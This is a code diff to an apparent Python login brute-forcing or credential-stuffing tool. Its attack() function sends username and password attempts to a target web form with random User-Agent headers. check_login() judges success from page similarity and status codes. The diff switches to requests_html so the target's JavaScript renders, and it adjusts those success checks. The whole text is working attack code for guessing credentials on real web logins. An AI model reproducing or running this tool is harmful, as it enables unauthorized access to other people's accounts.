@@ -1,8 +1,7 @@
 import sys
 import time
 from scipy import rand
-
-
+from requests_html import HTMLSession
 import time
 import requests
 from lxml import html
@@ -73,12 +72,16 @@ def attack(content):
     headers['User-Agent'] = get_random_user_agent()
     payload = content['req_body']
     print("[+ req_body]: " + str(content['req_body']))
-
-    res = requests.get(url)
+    session = HTMLSession()
+    res = session.get(url)
+    res.html.render(sleep=1, keep_page=True)
     if content['method'] == 'post':
-        resp = requests.post(content['host'], data=payload)
+        resp = session.post(content['host'], data=payload)
+        resp.html.render(sleep=1)
     else:
-        resp = requests.get(url,data=payload,headers=headers)
+        resp = session.get(url,data=payload,headers=headers)
+        resp.html.render(sleep=1)
+
     print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
     print(resp.status_code)
     if check_login(resp, res):
@@ -136,13 +139,13 @@ def check_login(content_1, content_2):
     k=0.3
     similarity = k * structural_similarity(content_1.text, content_2.text) + (1 - k) * style_similarity(content_1.text, content_2.text)
     
-    if  content_1.status_code > 400:
+    if  content_1.status_code >= 400:
         return False
     
-    elif similarity < 0.7 and len(content_1.text) > len(content_2.text):
+    elif similarity < 0.7 and len(content_1.html.html) > len(content_2.html.html):
         return True
     
-    elif  content_1.status_code == 201 or content_1.status_code == 302:
+    elif  content_1.status_code == 201:
         return True
 
     else:
